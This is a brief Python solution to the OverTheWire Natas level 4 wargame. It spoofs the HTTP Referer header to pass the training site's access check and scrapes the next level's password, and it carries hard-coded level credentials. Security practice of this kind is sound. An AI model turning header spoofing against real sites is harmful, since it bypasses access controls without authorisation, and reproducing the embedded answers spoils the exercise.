import requests
import re

url = 'http://natas4.natas.labs.overthewire.org/'
auth = requests.auth.HTTPBasicAuth('natas4', 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')
response = requests.get(url, auth=auth, headers={'referer': 'http://natas5.natas.labs.overthewire.org/'})
password = re.findall('Access granted. The password for natas5 is (.*)', response.text)
print(password[0]) # iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

